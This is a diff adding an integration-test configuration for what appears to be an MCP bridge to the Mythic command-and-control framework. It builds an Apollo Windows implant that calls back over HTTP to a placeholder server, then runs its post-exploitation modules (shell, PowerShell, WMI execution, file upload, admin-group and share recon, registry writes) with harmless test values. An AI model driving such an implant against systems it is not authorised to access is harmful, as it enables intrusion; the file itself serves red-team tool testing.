@@ -1,0 +1,249 @@
+# MythicMCP Integration Test Configuration — Apollo Only
+# Copy to config.yaml and fill in your environment details:
+#   cp config.apollo.yaml config.yaml
+#
+# This tests Apollo (Windows C# agent) in isolation.
+
+mythic:
+  server_url: "https://MYTHIC_IP:7443"
+  api_token: "eyJ..."
+  # username: "mythic_admin"
+  # password: "your_password_here"
+  timeout: 30
+
+timeouts:
+  payload_generation: 300
+  callback_verification: 120
+  command_execution: 60
+  polling_interval: 5
+
+agents:
+  - name: "apollo"
+    payload_type: "apollo"
+    os: "Windows"
+    filename: "apollo_test.exe"
+    c2_profiles:
+      - c2_profile: "http"
+        c2_profile_parameters:
+          callback_host: "https://MYTHIC_IP"
+          callback_port: 443
+    build_parameters: []
+    description: "Apollo test payload for Windows targets"
+
+targets:
+  - name: "windows-target"
+    hostname: "WIN11-PC"
+    os: "Windows"
+    callback_id: 1
+    upload_path: "C:\\Users\\Public\\test_payload.exe"
+    agents:
+      - "apollo"
+
+# Prerequisites:
+#   - The test runner auto-uploads tests/integration/fixtures/test_upload.txt
+#     and substitutes REPLACE_WITH_FILE_ID at runtime. No manual step needed.
+#
+# IMPORTANT: Apollo uses modular command loading. Only shell and load are
+# built into the payload by default. All other commands must be loaded at
+# runtime via the "load" command before they can be used.
+test_commands:
+  apollo:
+    # =======================================================================
+    # Load all commands upfront — only shell and load are built-in defaults.
+    # Everything else must be loaded before use.
+    # =======================================================================
+    - command: "load"
+      parameters:
+        commands:
+          - "sleep"
+          - "powershell"
+          - "powerpick"
+          - "run"
+          - "wmiexecute"
+          - "pwd"
+          - "ls"
+          - "cat"
+          - "mkdir"
+          - "cp"
+          - "mv"
+          - "rm"
+          - "upload"
+          - "download"
+          - "ps"
+          - "jobs"
+          - "ifconfig"
+          - "netstat"
+          - "net_shares"
+          - "net_localgroup"
+          - "net_localgroup_member"
+          - "reg_query"
+          - "reg_write_value"
+          - "sc"
+      expected_output: ""
+      timeout: 300
+
+    # =======================================================================
+    # Set callback interval to 1s for faster test execution
+    # =======================================================================
+    - command: "sleep"
+      parameters:
+        interval: 1
+        jitter: 0
+      expected_output: ""
+      timeout: 30
+
+    # =======================================================================
+    # Shell & Execute — validate each execution path
+    # =======================================================================
+    - command: "shell"
+      parameters: "whoami"
+      expected_output: "\\"           # domain\user
+      timeout: 60
+    - command: "powershell"
+      parameters: "$env:COMPUTERNAME"
+      expected_output: ""             # any non-empty hostname
+      timeout: 60
+    - command: "powerpick"
+      parameters: "$env:USERNAME"
+      expected_output: ""             # username
+      timeout: 120
+    - command: "run"
+      parameters:
+        executable: "whoami.exe"
+        arguments: ""
+      expected_output: "\\"           # domain\user
+      timeout: 60
+    - command: "wmiexecute"
+      parameters:
+        command: "cmd.exe /c hostname"
+      expected_output: ""             # hostname
+      timeout: 60
+
+    # =======================================================================
+    # File Operations — sequenced: pwd → ls → mkdir → upload → cat → cp → mv → rm
+    # =======================================================================
+    - command: "pwd"
+      parameters: ""
+      expected_output: "C:\\"
+      timeout: 60
+    - command: "ls"
+      parameters:
+        path: "C:\\Users"
+      expected_output: "Public"
+      timeout: 60
+    - command: "mkdir"
+      parameters:
+        path: "C:\\Users\\Public\\mcp_test"
+      expected_output: ""
+      timeout: 30
+    - command: "upload"
+      parameters:
+        file: "REPLACE_WITH_FILE_ID"
+        remote_path: "C:\\Users\\Public\\mcp_test\\test.txt"
+      expected_output: ""
+      timeout: 120
+    - command: "cat"
+      parameters:
+        path: "C:\\Users\\Public\\mcp_test\\test.txt"
+      expected_output: "MythicMCP-test-fixture"
+      timeout: 60
+    - command: "cp"
+      parameters:
+        source: "C:\\Users\\Public\\mcp_test\\test.txt"
+        destination: "C:\\Users\\Public\\mcp_test\\test_copy.txt"
+      expected_output: ""
+      timeout: 60
+    - command: "mv"
+      parameters:
+        source: "C:\\Users\\Public\\mcp_test\\test_copy.txt"
+        destination: "C:\\Users\\Public\\mcp_test\\test_moved.txt"
+      expected_output: ""
+      timeout: 60
+    - command: "rm"
+      parameters:
+        path: "C:\\Users\\Public\\mcp_test\\test_moved.txt"
+      expected_output: ""
+      timeout: 30
+    - command: "rm"
+      parameters:
+        path: "C:\\Users\\Public\\mcp_test\\test.txt"
+      expected_output: ""
+      timeout: 30
+
+    # =======================================================================
+    # Process & Jobs
+    # =======================================================================
+    - command: "ps"
+      parameters: ""
+      expected_output: "svchost"      # always present on Windows
+      timeout: 60
+    - command: "jobs"
+      parameters: ""
+      expected_output: ""             # may be empty if no long-running jobs
+      timeout: 30
+
+    # =======================================================================
+    # Network Recon
+    # =======================================================================
+    - command: "ifconfig"
+      parameters: ""
+      expected_output: "Address"      # NIC address info
+      timeout: 30
+    - command: "netstat"
+      parameters:
+        tcp: true
+      expected_output: ""             # TCP connection table
+      timeout: 30
+    - command: "net_shares"
+      parameters: "{}"
+      expected_output: "ADMIN\\$"      # default admin share
+      timeout: 30
+    - command: "net_localgroup"
+      parameters: "{}"
+      expected_output: "Administrators"
+      timeout: 30
+    - command: "net_localgroup_member"
+      parameters:
+        group: "Administrators"
+      expected_output: ""             # at least one admin account
+      timeout: 30
+
+    # =======================================================================
+    # Registry
+    # =======================================================================
+    - command: "reg_query"
+      parameters:
+        hive: "HKLM"
+        key: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
+      expected_output: "ProductName"  # always present
+      timeout: 30
+    - command: "reg_write_value"
+      parameters:
+        hive: "HKCU"
+        key: "SOFTWARE\\MythicMCP_Test"
+        value_name: "test_value"
+        value_value: "mcp_integration_test"
+        value_type: "REG_SZ"
+      expected_output: ""
+      timeout: 30
+    - command: "reg_query"            # verify the write
+      parameters:
+        hive: "HKCU"
+        key: "SOFTWARE\\MythicMCP_Test"
+      expected_output: "test_value"
+      timeout: 30
+
+    # =======================================================================
+    # Service Control
+    # =======================================================================
+    - command: "sc"
+      parameters:
+        action: "query"
+      expected_output: "Spooler"      # Print Spooler present on most Windows
+      timeout: 60
+    - command: "sc"
+      parameters:
+        action: "query"
+        service: "Spooler"
+      expected_output: "Spooler"
+      timeout: 60
